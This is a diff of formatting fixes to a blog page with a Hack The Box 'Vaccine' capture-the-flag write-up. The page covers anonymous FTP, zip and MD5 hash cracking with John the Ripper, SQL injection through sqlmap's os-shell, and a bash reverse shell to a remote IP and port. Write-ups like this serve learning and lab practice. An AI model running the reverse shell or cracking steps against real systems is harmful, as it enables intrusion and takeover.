@@ -9,7 +9,7 @@ title: HTB | Vaccine
     <img src="/images/htb/very-easy/vaccine/vaccine.png" alt="vaccine logo" style="width: 10%; height: auto;">  
      <h1>HTB - Vaccine</h1>
     <p><strong>Operating System:</strong> Linux<br>
-      <strong>Tags:</strong> FTP, Apache, John The Ripper,PostgreSQL, <br>Vim</p>
+      <strong>Tags:</strong> FTP, Apache, John The Ripper, PostgreSQL, Vim</p>
 
     <h2>Information Gathering</h2>
     <p>First I started with a basic Nmap scan to identify open ports and services. This scan revealed FTP, SSH, and an Apache webserver all actively running. I noticed that FTP had anonymous login enabled, so I checked that out first.</p>
@@ -20,7 +20,7 @@ title: HTB | Vaccine
     <p>Using anonymous login, I discovered a <code>backup.zip</code> file which was encrypted.</p>
     <pre><code>$ ftp 10.129.183.17<br>ftp> get backup.zip</code></pre>
     <img src="/images/htb/very-easy/vaccine/vaccine_ftp.png" alt="Vaccine ftp backup">
-    <br><br>
+    <br>
     <img src="/images/htb/very-easy/vaccine/vaccine_backup_encrypted.png" alt="Vaccine backup encrypted">
     <p>To crack the zip file I used <code>zip2john</code> to create the hash, and then used <code>john</code> with the <code>rockyou.txt</code> wordlist. This revealed the password "<code>741852963</code>" to access the zip.</p>
     <pre><code>$ zip2john backup.zip > zip.hash<br>$ john --wordlist=../Wordlists/rockyou.txt zip.hash</code></pre>
@@ -36,7 +36,7 @@ title: HTB | Vaccine
     <img src="/images/htb/very-easy/vaccine/vaccine_admin_password.png" alt="Vaccine admin password">
     <pre><code>$ echo -n "2cb42f8734ea607eefed3b70af13bbd3" > admin.hash<br>$ john --format=raw-md5 --wordlist=../Wordlists/rockyou.txt admin.hash</code></pre>
     <p>I then traveled to the Apache webpage and logged in as the admin to find a database on the dashboard. Immediately I thought of SQLi as a potential vulnerability, so I tested the search bar parameter with a single quote.</p>
-    <img src="/images/htb/very-easy/vaccine/vaccine_admin_dashboard.png" alt="Vaccine admin dashboard" style="width: 90%; height: auto;">
+    <img src="/images/htb/very-easy/vaccine/vaccine_admin_dashboard.png" alt="Vaccine admin dashboard">
     <br>
     <img src="/images/htb/very-easy/vaccine/vaccine_single_quote.png" alt="Vaccine sql single quote">
     <p>A single quote produced an error, which proved likely that SQLi was possible. I loaded up <code>Burp Suite</code> to capture the search request, and forwarded that to <code>sqlmap</code>.
@@ -45,7 +45,7 @@ title: HTB | Vaccine
     <img src="/images/htb/very-easy/vaccine/vaccine_sqlmap.png" alt="Vaccine sqlmap" style="width: 90%; height: auto;">  
     <p>Sqlmap did find a vulnerability, which converted into a shell with the <code>--os-shell</code> flag. After confirming I had command injection, I set up <code>netcat</code> to create a reverse shell to my machine. With some quick searching, I found the user flag.</p>
     <pre><code>os-shell> bash -c 'bash -i >& /dev/tcp/10.10.15.65/9001 0>&1'</code></pre>
-    <img src="/images/htb/very-easy/vaccine/vaccine_sqlmap_reverse" alt="Vaccine sqlmap reverse shell">
+    <img src="/images/htb/very-easy/vaccine/vaccine_sqlmap_reverse.png" alt="Vaccine sqlmap reverse shell">
     <br>
     <img src="/images/htb/very-easy/vaccine/vaccine_netcat_shell.png" alt="Vaccine netcat shell">
     <br>
@@ -66,5 +66,6 @@ title: HTB | Vaccine
     <img src="/images/htb/very-easy/vaccine/vaccine_root_flag.png" alt="Vaccine root flag">  
 
   </div>
+
 
 
